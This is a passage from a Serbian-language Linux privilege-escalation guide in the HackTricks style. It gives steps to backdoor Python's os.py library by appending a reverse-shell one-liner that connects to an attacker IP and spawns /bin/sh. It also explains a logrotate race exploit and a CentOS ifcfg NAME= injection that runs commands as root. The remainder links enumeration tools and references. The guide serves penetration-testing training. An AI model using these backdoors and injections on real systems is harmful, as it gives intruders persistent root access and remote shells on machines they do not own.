Ako znate **odakle** će se izvršiti python skripta i ako **možete pisati unutar** te fascikle ili možete **modifikovati python biblioteke**, možete modifikovati OS biblioteku i dodati backdoor (ako možete pisati gde će se izvršiti python skripta, kopirajte i nalepite os.py biblioteku).

Da **dodate backdoor u biblioteku**, samo dodajte na kraj os.py biblioteke sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` omogućava korisnicima sa **pravima pisanja** na log fajl ili njegove roditeljske direktorijume da potencijalno dobiju eskalirane privilegije. To je zato što `logrotate`, koji često radi kao **root**, može biti manipulisan da izvršava proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!NOTE]
> Ova ranljivost pogađa `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Možete iskoristiti ovu ranljivost sa [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranljivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logovi),** tako da kada god otkrijete da možete menjati logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenom logova simboličkim linkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca na ranljivost:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **piše** `ifcf-<bilo šta>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može da **prilagodi** postojeću, onda je vaš **sistem pwned**.

Mrežne skripte, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager-a (dispatcher.d).

U mom slučaju, `NAME=` atribut u ovim mrežnim skriptama nije pravilno obrađen. Ako imate **belu/praznu prostor u imenu, sistem pokušava da izvrši deo nakon bele/prazne prostore**. To znači da se **sve nakon prve praznine izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, i rc.d**

Direktorijum `/etc/init.d` je dom **skripti** za System V init (SysVinit), **klasični sistem upravljanja servisima** na Linuxu. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servise. Ove se mogu izvršavati direktno ili putem simboličkih linkova pronađenih u `/etc/rc?.d/`. Alternativni put u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim **sistemom upravljanja servisima** koji je uveo Ubuntu, koristeći konfiguracione datoteke za zadatke upravljanja servisima. I pored prelaska na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** se pojavljuje kao moderan menadžer inicijalizacije i servisa, nudeći napredne funkcije kao što su pokretanje demona na zahtev, upravljanje automount-om i snimke stanja sistema. Organizuje datoteke u `/usr/lib/systemd/` za distribucione pakete i `/etc/systemd/system/` za izmene administratora, pojednostavljujući proces administracije sistema.

## Ostali trikovi

### NFS eskalacija privilegija

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Izbegavanje ograničenih ljuski

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Zaštite bezbednosti jezgra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix alati za eskalaciju privilegija

### **Najbolji alat za traženje lokalnih vektora eskalacije privilegija na Linuxu:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opcija)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kolekcija više skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
